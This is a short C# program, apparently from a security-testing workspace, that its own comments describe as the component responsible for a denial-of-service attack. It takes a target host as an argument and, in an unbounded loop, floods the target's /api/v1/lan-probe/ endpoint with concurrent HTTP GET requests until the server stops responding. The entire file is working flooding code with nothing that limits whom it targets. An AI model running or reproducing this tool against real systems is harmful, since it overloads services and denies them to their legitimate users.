using System.Diagnostics;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace SecurityWorkspace {
	internal class Program {

		/*
		 * This, admittedly badly named program is responsible for the DoS attack.
		 * This is seperated into a loose .exe as this increases the threading and performance capabilities
		 * WinForms was not fast enough for this use case.
		 */

		static readonly HttpClient httpClient = new HttpClient();
		

		static void Main(string[] args) {

			Console.WriteLine("Starting to deny service to " + args[0]);

			//As fast is it can it starts these tasks. This may take a lot of CPU capacity and network bandwidth!
			while (true) {
				//This runs in a seperate thread:
				Task.Run(() => SendLink("http://" + args[0] + "/api/v1/lan-probe/"));
			}

		}

		static async Task SendLink(string url) {
			try {
				//The response does need to be actually used, but I'm not entirely sure as to why
				//Maybe the compiler just doesn't actually execute it if the response is not used.
				using HttpResponseMessage response = await httpClient.GetAsync(url);
				response.EnsureSuccessStatusCode();
				string responseBody = await response.Content.ReadAsStringAsync();

				//Same for these console writelines
				Console.WriteLine(responseBody);
			} catch (HttpRequestException e) {
				//This will start happening when the server does not respond after being overloaded
				Console.WriteLine(e.Message);
			}
		}
	}
}
